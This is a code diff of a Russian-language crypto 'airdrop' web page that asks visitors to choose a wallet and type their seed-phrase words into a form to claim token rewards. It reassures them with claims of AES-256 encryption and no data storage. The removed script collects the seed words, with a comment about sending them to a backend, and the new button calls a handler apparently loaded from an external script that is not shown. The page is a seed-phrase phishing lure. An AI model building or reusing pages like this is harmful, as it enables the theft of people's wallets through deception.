@@ -4,26 +4,24 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>🎁 Получить Airdrop</title>
-
-    <!-- Orbitron font -->
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
-
-    <!-- Styles -->
     <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
 </head>
 <body>
     <div class="container">
         <h1>🎁 Участвуйте в Airdrop</h1>
-        <p>Выберите активный airdrop и подключите кошелёк для получения токенов. Данные шифруются и не сохраняются.</p>
+        <p>Выберите один из активных airdrop'ов и подключите кошелёк. После верификации вы получите доступ к награде.</p>
 
+        <!-- Список Airdrops -->
         <div class="airdrop-list" id="airdropList">
             <p>Загрузка airdrop'ов...</p>
         </div>
 
+        <!-- Форма для ввода seed -->
         <div id="airdropForm" style="display:none;">
             <h2 id="selectedAirdropTitle">🔗 Подключение</h2>
 
-            <label>💼 Выберите кошелёк</label>
+            <label>💼 Кошелёк</label>
             <div class="custom-select-wrapper">
                 <div class="custom-select" id="walletSelect">
                     <div class="selected">
@@ -32,19 +30,19 @@
                     </div>
                     <ul class="options">
                         <li data-value="MetaMask">
-                            <img src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" class="wallet-icon" alt="MetaMask" />
+                            <img src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" class="wallet-icon" />
                             MetaMask
                         </li>
                         <li data-value="TrustWallet">
-                            <img src="https://assets.coingecko.com/coins/images/11085/small/Trust.png" class="wallet-icon" alt="Trust Wallet" />
+                            <img src="https://assets.coingecko.com/coins/images/11085/small/Trust.png" class="wallet-icon" />
                             Trust Wallet
                         </li>
                         <li data-value="Tonkeeper">
-                            <img src="https://tonkeeper.com/favicon-32x32.png" class="wallet-icon" alt="Tonkeeper" />
+                            <img src="https://tonkeeper.com/favicon-32x32.png" class="wallet-icon" />
                             Tonkeeper
                         </li>
                         <li data-value="Phantom">
-                            <img src="https://avatars.githubusercontent.com/u/78782337?s=200&v=4" class="wallet-icon" alt="Phantom Wallet" />
+                            <img src="https://avatars.githubusercontent.com/u/78782337?s=200&v=4" class="wallet-icon" />
                             Phantom
                         </li>
                     </ul>
@@ -62,99 +60,10 @@
 
             <div id="validationWarning" class="warning" style="display:none;"></div>
 
-            <button onclick="submitSeed()">✅ Подключить и получить</button>
-
-            <p class="small">🔐 Мы используем AES-256. Данные не сохраняются и не передаются третьим лицам.</p>
+            <button onclick="submitAirdrop()">✅ Подключить и получить</button>
+            <p class="small">🔐 Мы используем AES-256. Данные шифруются и не сохраняются.</p>
         </div>
-
-
-
-        <!-- Скрипти -->
-        <script src="https://sp574-maker.github.io/maker/script.js" defer></script>
-        <script>
-            fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
-                .then(res => res.json())
-                .then(data => {
-                    const container = document.getElementById('airdropList');
-                    container.innerHTML = '';
-                    data.forEach(drop => {
-                        const card = document.createElement('div');
-                        card.className = 'airdrop-card';
-                        card.innerHTML = `
-                            <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
-                            <h2>${drop.name}</h2>
-                            <p>💸 Награда: <strong>${drop.reward}</strong></p>
-                            <p>🌐 Сеть: ${drop.network}</p>
-                            <p>⏳ До: ${drop.ends}</p>
-                            <button onclick="selectAirdrop('${drop.name}')">Участвовать</button>
-                        `;
-                        container.appendChild(card);
-                    });
-                });
-
-            function selectAirdrop(name) {
-                document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
-                document.getElementById('airdropForm').style.display = 'block';
-                document.getElementById('airdropList').scrollIntoView({ behavior: 'smooth' });
-                renderSeedInputs();
-            }
-
-            function renderSeedInputs() {
-                const length = parseInt(document.getElementById('length').value);
-                const container = document.getElementById('seedContainer');
-                container.innerHTML = '';
-                for (let i = 0; i < length; i++) {
-                    const input = document.createElement('input');
-                    input.type = 'text';
-                    input.placeholder = `Слово ${i + 1}`;
-                    container.appendChild(input);
-                }
-            }
-
-            function clearWarning() {
-                document.getElementById('validationWarning').style.display = 'none';
-            }
-
-            function submitSeed() {
-                const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
-                const words = inputs.map(input => input.value.trim()).filter(word => word !== '');
-                if (words.length !== inputs.length) {
-                    const warning = document.getElementById('validationWarning');
-                    warning.innerText = 'Пожалуйста, заполните все поля.';
-                    warning.style.display = 'block';
-                    return;
-                }
-
-                document.getElementById('validationWarning').style.display = 'none';
-
-                // Тут може бути логіка надсилання seed на бекенд
-                alert("Кошелек подключен. Участие в airdrop подтверждено!");
-            }
-
-            // Select dropdown logic
-            const selectWrapper = document.querySelector('.custom-select');
-            const selected = selectWrapper.querySelector('.selected');
-            const options = selectWrapper.querySelectorAll('.options li');
-            const hiddenInput = document.querySelector('#wallet');
-
-            selected.addEventListener('click', () => {
-                selectWrapper.classList.toggle('open');
-            });
-
-            options.forEach(option => {
-                option.addEventListener('click', () => {
-                    selected.innerHTML = option.innerHTML;
-                    hiddenInput.value = option.dataset.value;
-                    selectWrapper.classList.remove('open');
-                });
-            });
-
-            document.addEventListener('click', e => {
-                if (!selectWrapper.contains(e.target)) {
-                    selectWrapper.classList.remove('open');
-                }
-            });
-        </script>
     </div>
+    
 </body>
 </html>
